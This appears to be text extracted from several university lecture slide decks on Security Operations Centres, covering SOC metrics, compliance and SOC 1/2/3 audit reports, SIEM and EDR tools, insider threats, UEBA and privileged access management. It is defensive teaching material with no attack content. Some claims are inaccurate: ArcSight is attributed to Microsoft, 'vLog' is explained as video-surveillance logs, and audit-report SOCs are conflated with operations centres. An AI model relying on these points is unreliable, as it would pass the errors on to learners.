the security incident, including the timeline, root cause, and impact analysis.\nC. The lessons learned and recommendations section provides recommendations for improving the   incident response process.\n7.3 Importance of lessons learned and continuous improvement \nHow to improve MTTD: \nImplement robust monitoring and alerting systems to identify issues quickly. Those tools should be capable of notifying the related individuals and teams of the incidents, providing comprehensive incident information. Furthermore, the tools should escalate the incidents to higher levels if no action is taken at lower incident response levels.\nRegularly assess your systems for vulnerabilities using techniques such as vulnerability scanning and penetration testing. These measures will assist in proactively identifying potential threats.\nEducate employees on how to proactively identify and report suspicious activities and unusual system behaviors. It will aid in early detection and response to potential security threats.\n\nHow to improve MTTR: \nYou can improve your documentation by documenting known issues, solutions and troubleshooting steps. It enables SOC teams to resolve incidents efficiently.\nUse effective communication and collaboration through knowledge sharing using collaborative tools will help speed up the incident resolution process.\nAutomate manual tasks such as data corrections, testing, and incident triage to save time, minimize human error, and accelerate the overall resolution process.\n\n\nHow to improve FPR\nConstantly refine threat detection rules and thresholds used to generate alerts using the latest threat information and intelligence.\nUse innovative technologies like Artificial Intelligence (AI) and Machine Learning (ML) to improve the accuracy of SOC metrics.\nImprove data quality, as inaccurate and inconsistent data can produce more false positives.\nPerform threat hunting to proactively detect potential threats. It helps you identify false positives and improve the overall accuracy of your threat detection systems.\nHow to improve FNR \nComprehensively monitor the organization, covering all applications, systems and networks 24/7. This will reduce the chance of any cyberattack going undetected. \nMature your operations. Based on the capabilities of the organization, you can leverage advanced threat detection techniques such as threat intelligence, AI, and ML-based threat detection to further enhance their detection capabilities. \nRegularly invest in training and awareness programs to stay up to date with the latest cybersecurity trends and attack techniques. It will help address any security gaps.\nHow to reduce the cost of an incident\nProactive monitoring, faster incident response, and remediation are critical to reducing the overall cost of an incident.  Implement robust security mechanisms such as antivirus software, strict access controls, and regular software updates to prevent cyber incidents from occurring in the first place. Conduct continuous security vulnerability assessments to identify potential vulnerabilities and remediate them proactively.\n\n7.4 What Is Cybersecurity Compliance?\n The business world is rapidly changing and becoming more data-driven and technologically advanced. Whether it's hardware or software, organizations must leverage information technology to improve their operational efficiency, gather more data for analytics and empower their workforce.\nNew industry standards and regulations regarding data and cybersecurity have made compliance more challenging for organizations. However, cybersecurity compliance is a driving force behind any organization’s success. Compliance is not just a checkbox for government regulations, but also a formal way of protecting your organization from cyberattacks, such as distributed denial of service (DDoS), phishing, malware, ransomware and more.\nTypes of Data Subjected to Cybersecurity Compliance\nMost cybersecurity and data protection laws revolve around sensitive data, including three different types: personally identifiable information (PII), financial information and protected health information (PHI).\n\n\nOther types of sensitive information may also fall under these compliance requirements and laws:\nRace\nReligion\nMarital status\nIP addresses\nEmail addresses, usernames and passwords\nBiometric data (fingerprints, facial recognition and voice prints)\nFinancial Information\nCredit card numbers, expiration dates and card verification values (CVV)\nBank account information\nDebit or credit card personal identification numbers (PINs)\nCredit history or credit ratings\n\nProtected Health Information\nMedical history\nInsurance records\nAppointment history\nPrescription records\nHospital admission records\nPersonally Identifiable Information (PII)\nDate of birth\nFirst/last names\nAddress\nSocial security number (SSN)\nMother's maiden name\nSOC's role in compliance and regulatory requirements \nService Organization Control (SOC) compliance is a vital framework that organizations adopt to ensure top-tier data security and operational reliability. \nThrough a thorough external audit, this certification confirms an organization's dedication to protecting data with rigorous standards.\nCentral to this compliance is SOC for Cybersecurity—a dedicated examination designed to assist organizations in strengthening their digital safeguards. \nAs cyber threats continue to evolve, businesses that prioritize and adhere to SOC standards are better positioned to protect sensitive data, maintain operational integrity, and foster a strong reputation in their respective industries. \nThis commitment not only safeguards the organization's assets but also builds confidence among clients, partners, and investors, all of whom value the assurance that their data and interactions are held to the highest standards of security and confidentiality.\nDifferences Between \u000bVarious  Service Organization Control (SOC) Types ‍\nNavigating the landscape of SOC compliance reveals its multifaceted nature, branching into distinct types tailored for specific operational needs. \nSOC 1: Predominantly concerned with financial controls, SOC 1 is a crucial framework for organizations with a significant focus on financial reporting. This type offers an in-depth view of an organization's internal controls that might impact its financial statements.  \nBy ensuring that these controls are robust and transparent, SOC 1 certification becomes an indispensable asset for businesses looking to assure stakeholders of their financial integrity and transparency. Especially relevant for entities like banks, investment firms, and financial service providers, SOC 1 aids in fostering trust and credibility.\nSOC 2: As perhaps the most encompassing of the SOC types, SOC 2 dives deep into the Trust Service Criteria. These criteria, encompassing security, availability, processing integrity, confidentiality, and privacy, offer a comprehensive view of an organization's data management and protection strategies. Each criterion holds unique significance:\nSecurity: Assures stakeholders of protection against unauthorized access, be it physical or digital.\nAvailability: Guarantees systems and data are available for operation and use as committed or agreed upon.\nProcessing Integrity: Ensures system processing is complete, valid, accurate, timely, and authorized.\nConfidentiality: Information designated as confidential is protected as such.\nPrivacy: Personal information is collected, used, retained, and disposed of in line with the organization's commitments and system requirements.\n‍SOC 3: While it resonates with the principles of SOC 2, SOC 3 has a distinct identity. SOC 3 offers a summarized, general-use report designed primarily for public consumption. This makes it accessible to a broader audience, including potential clients or partners who might want an overview of an organization's controls without delving into specific details. For organizations looking to showcase their commitment to data security without disclosing intricate details, SOC 3 becomes an ideal choice.\nGiven its comprehensive nature, SOC 2 becomes especially relevant for service providers storing customer data in the cloud, ensuring they maintain the highest data security and integrity standards.\nUnderstanding these variations becomes crucial for organizations aiming for SOC compliance. It allows them to select the variant that aligns seamlessly with their operational objectives, ensuring comprehensive compliance.\n\nWho is Required to Comply with SOC?\n\nThough SOC compliance might initially seem tailored for specific sectors, its importance cuts across various business types, from budding startups to well-established multinational corporations.\nService providers, such as cloud computing vendors, payment processors, and data storage companies, often grapple with vast volumes of sensitive data. Their central roles in data management and secure transactions make SOC compliance crucial to their operational integrity.\nSeveral industries inherently prioritize data security. For instance, the healthcare sector handles confidential patient records, finance deals with customer financial transactions, and e-commerce platforms manage both user data and transaction details. SOC compliance isn't just beneficial for these industries—it's often seen as a benchmark for operational trustworthiness.\nEmbracing SOC standards is more than a regulatory move. It's a clear indication of an organization's dedication to safeguarding data. \nGiven the potential ramifications of data breaches in today's digital environment, maintaining SOC compliance is both a protective measure and a strategic business decision.\nMain SOC Requirements for Cybersecurity ‍\nSOC compliance is anchored by five trust service principles, each with its distinct focus and set of criteria:\nSecurity: This principle ensures that system resources are well-guarded against unauthorized access. It's all about setting up the right measures to prevent unauthorized individuals or systems from accessing the data or the systems where this data is stored.\nAvailability: It pertains to the consistent availability of systems, products, or services as promised or agreed upon. It emphasizes the need for minimized system downtime or ensuring any downtime is within the organization's defined acceptable limits.\nProcessing Integrity: This principle stresses the importance of a system's accurate and timely operation. It ensures data processing happens as it should—timely, accurate, and always authorized.\nConfidentiality: Here, the emphasis is on ensuring that information designated as confidential remains so. It's about guaranteeing that sensitive data, be it personal details or intellectual property, remains shielded from unauthorized access.\nPrivacy: This principle dictates how personal information should be managed. It covers everything from how it's collected and used to its retention and eventual disposal, all in line with the organization's privacy notice\n\nWhat are the Penalties for Non-Compliance with SOC?\n\nEven though SOC compliance isn't a legal requirement, not adhering to its standards can seriously affect organizations. \nIf they fail to comply, they might face penalties stipulated in contracts, especially if non-compliance leads to data breaches or other security lapses.\nReputation is a valuable asset in today's digital age, and any perceived shortcomings in data security can tarnish an organization's image. This reputational damage can lead to lost business opportunities and make it harder to forge new partnerships or retain clients. Given clients' high value on trust and data security, even minor lapses or hints of non-compliance can escalate into significant challenges.\nMoreover, data breaches, which become more likely without SOC compliance, can indicate a relaxed approach to data protection. Such events don't just result in short-term financial losses due to penalties or compensation but can also strain or sever long-standing client relationships, leading to sustained revenue loss.\nGiven these risks, achieving SOC compliance is more than just about meeting a standard. It's an essential strategy for businesses aiming to protect their reputation, maintain client trust, and ensure their long-term success.\n\n\nReferences\nCSOC Metrics: Security Metrics & KPIs for Measuring SOC success.\n https://www.splunk.com/en_us/blog/learn/security-operations-metrics.html\n\nCreate a Post-Incident Review Report\nhttps://help.victorops.com/knowledge-base/post-incident-review/\n\nManageEngine M365 Manager Plus is a Microsoft 365 management and reporting tool\n https://demo.servicedeskplus.com/\n\nA K-12 Guide To Post-Incident Analysis\nhttps://managedmethods.com/blog/post-incident-analysis/\n\nWhat is SOC Compliance? Main Criteria and Requirements\nhttps://vendict.com/blog/what-is-soc-compliance-main-criteria-and-requirements\n\nWhat Is Cybersecurity Compliance?\nhttps://www.comptia.org/content/articles/what-is-cybersecurity-compliance\n\nDiscover Effective Security Operations Center – SOC Metrics and KPI with Real-World Examples \nhttps://blueteamresources.in/soc-metrics-and-kpi/\n\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Lecture 8 SOC Tools and Technologies.pptx": "Lecture 8:\nSOC Tools and Technologies \n\nObjective\nAfter Completing this chapter, you should be able to:\nDiscuss and compare variety of common SOC tools and technologies.\nUnderstand the need of vLog management and analysis tools\nUnderstand Threat intelligence platforms and feeds\nUnderstand Security analytics and visualization Tools.\nAn overview of common SOC tools & Technologies\nAt this point you have already understood that Security Operations Centers (SOCs) utilize a variety of software, platforms, and technologies aimed at monitoring, detecting, analyzing, and responding to cybersecurity threats. Here's a breakdown of some of the most commonly used tools in SOC environments:\nSIEM (Security Information and Event Management)\nSIEM platforms aggregate and analyze security events from various sources across the network, such as firewalls, intrusion detection/prevention systems (IDS/IPS), antivirus software, and servers.\nExamples include Splunk, IBM QRadar, ArcSight, and Elastic SIEM\n\nAn overview of common SOC tools & Technologies\nExample:  Splunk Enterprise Security is a SIEM platform that provides real-time monitoring, advanced analytics, and incident response capabilities. It collects and correlates security events from various sources, enabling security analysts to detect and respond to threats more efficiently.\nAn overview of common SOC tools & Technologies\nExample: IBM QRadar is a network security management platform that provides situational awareness and compliance support. QRadar uses a combination of flow-based network knowledge, security event correlation, and asset-based vulnerability assessment.\n\nAn overview of common SOC tools & Technologies\nExample: Microsoft ArcSight Enterprise Security Manager (ESM) is a great, adaptable SIEM that offers comprehensive data collection and real-time threat analysis, along with a native threat intelligence feed and native SOAR.\nSplunk has a 56.53% market share in the Security Information And Event Management (SIEM) category, while Micro Focus ArcSight ESM has a 1.17% market share in the same space.\nhttps://www.opentext.com/products/arcsight-enterprise-security-manager\nOther common SOC tools & Technologies\n1. Endpoint Detection and Response (EDR):\nEDR solutions provide real-time monitoring and response capabilities on endpoints, detecting and responding to suspicious activities and threats.\n Examples include CrowdStrike Falcon, Carbon Black, and SentinelOne.\nCrowdStrike Falcon is an EDR solution that offers continuous monitoring and endpoint protection.\nIt utilizes machine learning and behavioral analysis to detect and block sophisticated threats, such as malware and ransomware, on endpoints across the enterprise.\nOther common SOC tools & Technologies\n2. Network Traffic Analysis (NTA):\nNTA tools monitor network traffic to identify suspicious patterns, anomalies, and potential threats.\n Examples include Darktrace, Vectra AI, and Cisco Stealthwatch.\nDarktrace is a NTA tool that uses AI-driven algorithms to analyze network traffic and detect anomalies indicative of cyber threats. It provides real-time threat detection and response capabilities, helping organizations defend against evolving cyber attacks.\nNetwork Intrusion Detection and Prevention Systems (NIDS/NIPS)\nNIDS/NIPS are crucial components of a comprehensive security strategy. They play a vital role in identifying and preventing malicious activity on your network.\nThe role of NIDS/NIPS in the SOC ecosystem\nThreat Detection : NIDS/NIPS act as the first line of defense against network-based attacks by detecting malicious activity.\nSecurity Event Analysis: SOCs rely on NIDS/NIPS data to gain insights into attack patterns, identify potential threats, and prioritize responses.\nIncident Response: NIDS/NIPS provide valuable information for incident response teams to investigate attacks, isolate affected systems, and remediate vulnerabilities.\nNIDS/NIPS detection techniques\nSignature-based detection :\nThis technique relies on predefined patterns and signatures of known attacks.\nEffective against known threats. Requires constant updates to stay ahead of new attacks\nAnomaly-based detection:\nThis method identifies deviations from normal network traffic patterns, potentially indicating malicious activity.\nCan detect unknown threats. May generate false positives, requiring careful analysis.\nBehavior-based detection:\nThis approach focuses on analyzing the behavior of network traffic and identifying suspicious patterns.\nIntegrating NIDS/NIPS with other SOC tools\nSecurity Information and Event Management (SIEM) : SIEM systems aggregate and analyze security data from various sources, including NIDS/NIPS.\nFirewall: Firewalls provide a first line of defense by blocking unauthorized network traffic.\nEndpoint Security:Endpoint security solutions protect individual devices against malware and other threats.\nThreat Intelligence:Threat intelligence feeds provide insights into emerging threats and attack trends\nThreat Hunting:NIDS/NIPS can be used to proactively search for indicators of compromise and potential threats.\nIncident Response:NIDS/NIPS alerts provide valuable information for incident response teams to quickly identify and contain security incidents.\nForensics:NIDS/NIPS logs can be used to gather evidence and reconstruct attack timelines for forensic analysis.\nvLog Management and Analysis tools\nvLog management and analysis tools\nvLog management and analysis tools refer to software solutions specifically tailored for managing and analyzing video logs (vLogs) generated by security cameras and surveillance systems. \nThese tools are essential components of a comprehensive security infrastructure, particularly in environments where video surveillance plays a crucial role in threat detection, incident response, and forensic analysis.\nvLog management and analysis tools\nIn a SOC, vLog management and analysis tools are crucial for:\nReal-time Monitoring: Continuously analyzing video feeds from surveillance cameras to detect suspicious activities and security breaches.\nIncident Response: Providing visual evidence for investigating security incidents and determining the root cause, aiding in prompt response and remediation.\nForensic Analysis: Extracting metadata and contextual information from video footage to corroborate findings from other security data sources, strengthening incident attribution and evidence gathering.\nIntegration: Integrating with SIEM systems and threat intelligence platforms to correlate video logs with other security events for more effective threat detection and response.\nCompliance: Ensuring compliance with regulatory requirements by providing centralized storage, retrieval, and archival capabilities for video surveillance footage, mitigating legal and regulatory risks.\n\nvLog management and analysis tools\nExamples of vLogs management and analysis tools: \nVideo Management Systems (VMS): Provide centralized control and management of surveillance cameras, offering features like live video feeds, playback, analytics, and event notification.\nVideo Analytics Software: Utilizes algorithms to analyze video footage for motion detection, object identification, crowd counting, and behavior recognition, enhancing surveillance capabilities.\nVideo Forensics Tools: Aid in investigative analysis by enhancing video footage, conducting frame-by-frame analysis, stabilizing images, and tracking objects or individuals to extract valuable evidence.\nVideo Content Management Systems (VCMS): Organize, categorize, and store large volumes of video content efficiently, enabling easy retrieval based on metadata and timestamps while ensuring compliance with data retention policies.\nIntegration with Security Systems: Integration with other security systems like access control, intrusion detection, and alarm monitoring systems allows for centralized monitoring and correlation of video data with other security events, improving situational awareness and response.\nCloud-Based Solutions: Offer cloud-based deployment options for storing and accessing video footage remotely, providing scalability, flexibility, and accessibility across multiple locations.\nThreat intelligence platforms and feeds\nThreat intelligence platforms and feeds\nThreat intelligence platforms (TIPs) and feeds are tools and services that collect, analyze, and disseminate information about cybersecurity threats, vulnerabilities, and malicious activities. These platforms aggregate data from various sources, including open-source intelligence, commercial feeds, proprietary research, and information sharing communities, to provide organizations with actionable insights into emerging threats and trends.\n\nThreat intelligence platforms and feeds\nThreat Intelligence Feeds:\nThreat intelligence feeds are sources of curated threat intelligence data provided by external entities, such as cybersecurity vendors, research organizations, government agencies, and information sharing communities.\nThese feeds deliver timely information about known indicators of compromise (IOCs), malicious IP addresses, domain names, file hashes, and other threat attributes, helping organizations identify and block potential threats before they can cause harm.\nThreat intelligence feeds may be categorized as open-source feeds, commercial feeds, community-driven feeds, or proprietary feeds, depending on their sources and accessibility.\nExamples of threat intelligence feeds include the Open Threat Exchange (OTX) by AlienVault, VirusTotal Intelligence, IBM X-Force Exchange, and the Cyber Threat Alliance (CTA) shared intelligence platform.\n\nSecurity analytics and visualization Tools \nSecurity analytics and visualization Tools \nSecurity analytics and visualization tools are software solutions designed to collect, analyze, and visualize data related to cybersecurity threats, events, and trends. These tools help security teams make sense of large volumes of data generated by various security devices, systems, and applications, enabling them to identify anomalies, detect threats, and respond effectively to security incidents.\nExample:\nhttp://www.pycaret.org/tutorials/html/ANO101.html\n\nClass Activity:\u000bDiscuss how AI can contribute and enhance vLogs  \n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Lecture 9 -Insider Threats and User Monitoring.pptx": "Lecture 9:\nInsider Threats and User Monitoring\nCSSY4103 - Security Operations Centre (SOC)\nObjectives\nDefine Insider Threats\nImpacts of Insider Threats \nImplementing measures against insider threats\nUEBA\nPrivileged User\nPrivacy and Security\u000b\n\n\nUNDERSTANDING INSIDER THREATS AND THEIR IMPACT\nUNDERSTANDING INSIDER THREAT\nWhat is an Insider Threat :\nAn insider threat in cybersecurity refers to a security risk that originates from within an organization. This could be a current or former employee, contractor, vendor, or business partner who has authorized access to the organization's systems and data.\nThis can include damage caused by espionage, workplace/kinetic violence, unauthorized disclosure of national security information, or the loss or degradation of departmental resources or capabilities.\n\n\nTypes of Insider Threats\nIntentional Threats: Describe malicious insiders who intentionally harm the organization.\n\nUnintentional Threats: Discuss employees who inadvertently cause security breaches due to negligence or lack of awareness.\n\nCompromised Accounts: Explain how attackers can gain access to insider accounts to carry out malicious activities.\nWHY INSIDER THREAT: MOTIVATION\nIMPACTS OF INSIDER THREATS\nEGO: Feelings of self-importance which may lead to issues of an interpersonal or legal nature. \nPolitical: Allegiance or support for a foreign country or government, which could potentially lead to actions that favor the interests of that nation.\nIdeological: An insider threat motivated by ideological beliefs occurs when an individual takes actions against their organization due to strong political, social, or religious convictions. These motivations can lead to behaviors such as sabotage, espionage, or data theft, driven by the belief that the organization's actions conflict with their personal values or principles.\n\nIMPACTS OF INSIDER THREATS\nFinancial: Employees may exploit their access to steal sensitive data, trade secrets, or money for personal benefit.\nPersonal: A personal-based attack can be deeply invasive, breaching an individual's privacy by accessing sensitive information stored on devices or online accounts. This may include personal conversations, photos, videos, and browsing history. The emotional distress and loss of trust in digital platforms that can result from such an invasion is significant and should not be underestimated.\nWork performance: Issues that affect an individual's performance within an organization, such as an inability to complete goals or meet deadlines, could lead to termination. \n\nINSIDER CONCERNS (TTT)\nTime\nCan select an optimum time to implement a plan.\nCan extend actions over long periods\nTools\nKnows and capability to use tools already at work location\nCan test the system with typical “mistakes”\n Teamwork (Collusion)\nMay recruit/conspire with others, either insiders or outsiders\nIMPLEMENTING MEASURES AGAINST INSIDER THREATS\nImplement Robust Access Controls:\nPrinciple of Least Privilege: Ensure that employees only have access to the information necessary for their roles.\nRole-Based Access Control: Define access levels based on job functions and responsibilities.\nRegular Audits: Conduct periodic reviews of access permissions to identify and correct inappropriate access.\n\n\nConduct Regular Security Awareness Training\nTraining Programs: Regularly educate employees about security policies, potential threats, and safe practices.\nPhishing Simulations: Conduct simulated phishing attacks to teach employees how to recognize and avoid phishing attempts.\nPolicy Updates: Keep employees informed about any changes in security policies and procedures.\nMonitor User Behavior\nUser Behavior Analytics (UBA): Use UBA tools to detect anomalies in user behavior that could indicate a potential threat.\nActivity Logs: Maintain detailed logs of user activities and regularly review them for suspicious actions.\nReal-Time Monitoring: Implement real-time monitoring to quickly identify and respond to unusual behavior.\n\nComprehensive Background Checks\nPre-Employment Screening: Conduct thorough checks on new hires.\nOngoing Monitoring: Regularly update background checks to ensure continued trustworthiness.\nAdvanced Monitoring and Detection Tools\nUser Behavior Analytics (UBA): Use tools to detect behavioral anomalies.\nSecurity Information and Event Management (SIEM): Aggregate and analyze security data.\nData Loss Prevention (DLP): Monitor and protect sensitive data.\nInsider Threat Program\nDedicated Team: Have a team focused on insider threats.\nClear Policies: Enforce clear guidelines and procedures.\nIncident Response Plan: Have a response plan ready for insider threats\n\u000bSTEPS FOR USING PREVENTIVE AND PROTECTIVE MEASURES AGAINST POTENTIAL INSIDER THREATS\nRef : Preventive and protective measures against insider threats (iaea.org)\nINSIDER THREAT AWARENESS\nExplain the importance of detecting and reporting potential insider threats.\nIdentify indicators of insider threat behavior and procedures to report such behavior.\nDescribe methodologies of adversaries to recruit trusted insiders and collect classified information.\nUnderstand counterintelligence and security reporting requirements\nUSER AND ENTITY BEHAVIOR ANALYTICS (UEBA)\nUser and Entity behavior analytics (UEBA)\nUser and entity behaviour analytics (UEBA) is a security program that employs behavioral analytics, machine learning algorithms, and automation to detect aberrant and possibly hazardous user and device activity.\nUEBA provides teams with more comprehensive security information and improves the effectiveness of zero-trust security strategies.\nHOW UEBA WORKS\nData Collection and Analysis\nUEBA systems play a crucial role in network security by meticulously tracking user activity, network traffic, and access. This data is then processed by UEBA's advanced algorithms, which scrutinize every aspect of network user behaviour.\nEstablishing Baseline Behavior and Anomaly Detection\nUEBA's ability to define \"normal\" behaviour for each user and object is its primary competency. Current actions are compared to this baseline to identify abnormalities that may suggest data exfiltration, insider threats, or compromised accounts.\n\u000b\nTHREATS ADDRESSED BY UEBA\u000b\nAnomalous User Behavior: Detection of deviations from standard activity patterns, like unusual login times or changes in user behaviour.\nAccount Compromise Indicators: Identifying suspicious login attempts, including brute-force attacks and unauthorized access.\nPrivilege Abuse: Spotting misuse of extensive access rights and unauthorized attempts to alter permissions.\nInternal Threat Landscape: Addressing insider threats, including malicious insider activities, unauthorized data or application access, and data theft or sabotage efforts.\nData Exfiltration Tactics: Detecting attempts to transfer data unusually or access files in a way that suggests potential data exfiltration.\nTHREATS ADDRESSED BY UEBA\u000b\nMalware and Ransomware Activities: Identifying signs of malware or ransomware infections, including endpoint anomalies and patterns typical of ransomware.\nPolicy Violation Identification: Recognizing actions where users bypass security controls or access restricted resources, violating established policies.\nPhishing and Social Engineering Attempts: Detecting user interactions with malicious links or email attachments indicative of phishing or social engineering exploits.\nAdvanced Persistent Threats (APTs): Uncovering ongoing, sophisticated attacks that might elude standard security measures, providing an added detection layer.\nZero-Day Exploit Detection: Identifying previously unknown vulnerabilities and exploits crucial for defending against novel and emerging threats.\n\nInsider Threat Identification\nBehavioral Profiling and Risk Scoring\nCompliance and Regulatory Requirements\nAdvanced Threat Detection\nImproved Security Posture\nData Loss Prevention\nEfficient Incident Response\nAutomated Response and Remediation\nLong-term Trend Analysis and Forensics\nAdapting to Evolving Threat Landscape\nADVANTAGES OF APPLYING UEBA\nEXAMPLE OF USER & ENTITY BEHAVIOR ANALYTICS (UEBA) TOOLS\u000b\nTeramind\nSplunk User Behavior Analytics\nSecuronix\nGurucul\nManageEngine\nExabeam\nMicrosoft Sentinel\nRapid7\nLogRhythm\nCynet UBA\nVaronis\n\nMONITORING PRIVILEGED ACCOUNTS AND ACCESS\nPRIVILEGED USER\u000b\nThose with special access rights, such as database administrators, network engineers, security professionals, and cloud custodians, need full privileges to access databases, apps, servers, and networks to do their tasks. Specialized users can do the following with that level of access.\n\n PRIVILEGED USERS ACCESS\nChange servers, networks, apps, business devices (laptops, USB drives, external hard drives), and databases.\nConfigure user profiles and permissions.\nView sensitive material in their databases, including intellectual property, code, legal data, and employee and customer personal information.\nEdit or remove data, View, edit, or delete audit logs to address security warnings.\nTYPES OF PRIVILEGED ACCOUNTS\nPrivileged accounts: Privileged accounts provide access and privileges beyond those of non-privileged accounts (e.g., standard user accounts and guest user accounts).\nDomain administrator accounts: Domain administrator accounts are the highest level of control in a system. These accounts have access to all workstations and servers across your domain and control system configurations, admin accounts, and group memberships.\nLocal administrator accounts: Local administrator accounts have admin control over specific servers or workstations and are often created for maintenance tasks.\nApplication administrator accounts: Application administrator accounts have full access to specific applications and the data stored in them.\nBusiness privileged user accounts: Business privileged user accounts have high-level privileges based on job responsibilities.\nEmergency accounts: Emergency accounts provide unprivileged users with admin access to secure systems in the event of a disaster or disruption.\nDANGERS OF PRIVILEGED USER ACCOUNTS\u000b\nAvailability problem: Privileged users may misconfigure a component, blocking a website or resource. They might even alter passwords, blocking approved users.\nIntegrity problem: Privileged users may update or remove data, including audit logs that show purposeful or accidental  modifications.\nA confidentiality problem: Privileged users may access private data like personal identifying information (PII) even when it's not necessary for their work.\n\n\nMONITORING PRIVILEGED USERS\nTrack Privileged Access to Sensitive Data\nBlock or Alert on Suspect Activity\nIdentify Unauthorized Privileges Changes:\nSeparation of Duties\nEliminate Excessive and Unused Rights\nPRIVILEGED ACCESS MANAGEMENT (PAM) TOOLS \nJumpCloud Open Directory Platform™\nHeimdal™ Privileged Access Management\nARCON | Privileged Access Management\nBeyondTrust Privileged Remote Access\nBroadcom Symantec Privileged Access Management (PAM)\nCyberArk Privileged Access Management\nDelinea Secret Server\nManageEngine PAM\nOkta Privileged Access\nOne Identity Safeguard\n\nBALANCING PRIVACY AND SECURITY CONCERNS\nPRIVACY AND SECURITY\nPrivacy Concerns: Employees have a right to privacy in their work activities, especially those unrelated to their job duties. Extensive monitoring can create a sense of being watched and erode trust.\nSecurity Needs: Monitoring user activity can be crucial for identifying potential insider threats before they can cause significant damage.\nSTRATEGIES FOR A BALANCED APPROACH\nData Minimization: Collect only the data that is necessary for a specific purpose.\nPrivacy by Design: Integrate privacy considerations into the design and architecture of systems and processes from the start.\nTransparency and Consent: Ensure users are fully informed about data collection practices and obtain their explicit consent.\nData Security Measures: Implement robust security protocols to protect data from unauthorized access and breaches.\nUser Empowerment: Provide users with control over their data, including access, correction, and deletion rights.\nPrivacy Impact Assessments (PIAs): Evaluate and mitigate privacy risks associated with data processing activities.\nCompliance with Regulations: Adhere to relevant legal and regulatory requirements governing data protection and privacy.\nTraining and Awareness: Educate employees and stakeholders about privacy policies, practices, and their responsibilities.\nIncident Response and Notification: Develop and implement a plan for responding to data breaches and promptly notifying affected individuals and authorities.\nContinuous Improvement: Regularly review and update privacy practices to enhance data protection and adapt to changing risks and regulations.\nREFERENCES \u000b\nNational Research Council. (2007). Engaging Privacy and Information Technology in a Digital Age. Washington, DC: The National Academies Press. https://doi.org/10.17226/11896.\nCappelli, D. M., Moore, A. P., & Trzeciak, R. F. The CERT Guide to Insider Threats: How to Prevent, Detect, and Respond to Information Technology Crimes.\nTrzeciak, R. F., & Shaw, E. Insider Threat: Detection, Mitigation, Deterrence, and Prevention.\nSchneier, B. (2009). Privacy vs. Security: Balancing Individuals' Rights and Public Safety in the Digital Age.\nPayne, J. Inside Jobs: Why Insider Risk Is the Biggest Cyber Threat You Can't Ignore.\nBunn, M., & Sagan, S. D. Insider Threats (Cornell Studies in Security Affairs).\nIBM. (n.d.). User and Entity Behavior Analytics (UEBA). Retrieved from https://www.ibm.com/topics/ueba.\nPalo Alto Networks. (n.d.). What is User and Entity Behavior Analytics (UEBA)? Retrieved from https://www.paloaltonetworks.com/cyberpedia/what-is-user-entity-behavior-analytics-ueba.\nTeramind. (n.d.). UEBA Tools. Retrieved from https://www.teramind.co/blog/ueba-tools/.\nCybersecurity and Infrastructure Security Agency (CISA). (n.d.). Insider Threat Mitigation. Retrieved from https://www.cisa.gov/topics/physical-security/insider-threat-mitigation.\nCybersecurity and Infrastructure Security Agency (CISA). (2022). Insider Threat Mitigation Guide. Retrieved from https://www.cisa.gov/sites/default/files/2022-11/Insider%20Threat%20Mitigation%20Guide_Final_508.pdf.\nImperva. (n.d.). Privileged User Monitoring. Retrieved from https://www.imperva.com/learn/data-security/privileged-user-monitoring/.\nMicrosoft. (n.d.). What is Privileged Access Management (PAM)? Retrieved from https://www.microsoft.com/en-us/security/business/security-101/what-is-privileged-access-management-pam.\nFor any queries, please feel free to contact-Email: ramesh.palanisamy@utas.edu.om\n\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Spring 25 - Lecture 1-  Introduction to Security Operations Centers (SOCs).pptx": "Lecture 1:\nIntroduction to Security Operations Centers (SOCs)\nCSSY4103 - Security Operations Centre (SOC)\nOrientation\nBrainstorming session about the need of SOC\nCDP discussion\nA brief note about the lab activities, class activities\nIntroduce the vearius sources for Professional certification \n(CISCO, EC-Council and ISACA )\n\n\n\nObjectives\nAfter studying this chapter, you should be able to:\nDefine SOC as a centralized entity for security management.\nExplain the primary mission of safeguarding organizational assets.\nEmphasize the need for ongoing SOC evaluation in evolving business environments.\nDiscuss adaptation requirements during acquisitions or leadership changes.\nExplain the role of security in project justification.\n\n\n\nIntroduction to Security Operations Centers\nIntroduction to Security Operations Centers \nSecurity Operations Centers (SOCs) are centralized units that deal with security issues on both a business and technical level. \nTheir primary function is to protect an organization's assets, including material, intellectual property, and people. \nSOCs can take various forms, from a simple reception desk to large-scale, 24/7 global operations. \nThe size and complexity of a SOC depend on factors such as the organization's size, industry, and risk profile. \n\n\nWhat is a SOC?\u000b\nA Security Operations Center (SOC) is a centralized unit within an organization or managed by a third-party service provider that is responsible for monitoring, detecting, analyzing, and responding to cybersecurity threats in real time across an organization’s IT infrastructure.\nOverview of SOC's Role in Cybersecurity\nImportance of Security Operations Centers (SOCs) in Cybersecurity \nThreat Detection and Prevention:\nActively monitors networks, systems, and applications for suspicious activities and potential security breaches.\nDetects threats early to prevent or mitigate cyberattacks.\nRapid Incident Response:\nEnables swift and effective responses to security incidents.\nFollows established procedures to contain and remediate breaches, minimizing operational and data integrity impacts.\nContinuous Monitoring:\nProvides 24/7 surveillance of IT infrastructure.\nEnsures prompt resolution of security incidents, even outside business hours.\n\nImportance of Security Operations Centers (SOCs) in Cybersecurity \nRisk Management:\nIdentifies and addresses security vulnerabilities proactively.\nPrioritizes security measures based on real-time threat intelligence.\nCompliance Requirements:\nAssists organizations in meeting regulatory mandates.\nHelps avoid fines and legal consequences by ensuring compliance with industry standards.\nEnhanced Situational Awareness:\nAggregates and analyzes security data from various sources.\nProvides a comprehensive view of an organization’s security posture to inform strategic planning.\nProtection of Assets and Reputation:\nSafeguards sensitive data, intellectual property, and critical assets from unauthorized access or compromise.\nMaintains a strong security posture to protect organizational reputation and customer trust.\n\nRole of SOC in Cybersecurity\n\nThreat Intelligence Analysis:\nAnalyzes intelligence feeds to stay ahead of emerging threats.\nAdjusts security strategies based on industry reports and advisories.\nIncident Documentation and Reporting:\nMaintains detailed records of security incidents.\nProvides reports for compliance and regulatory purposes.\nContinuous Improvement:\nAdapts processes and technologies to counter evolving cyber threats.\n\nMonitoring and Detection:\nContinuously scans networks, systems, and applications for threats.\nUtilizes security tools such as Intrusion Detection Systems (IDS), Security Information and Event Management (SIEM), and Endpoint Detection and Response (EDR) solutions.\nIncident Response:\n Investigate incidents and mitigate threats.\nWorks with relevant stakeholders to execute response plans.\nVulnerability Management:\n Conduct regular assessments, patch management, and security 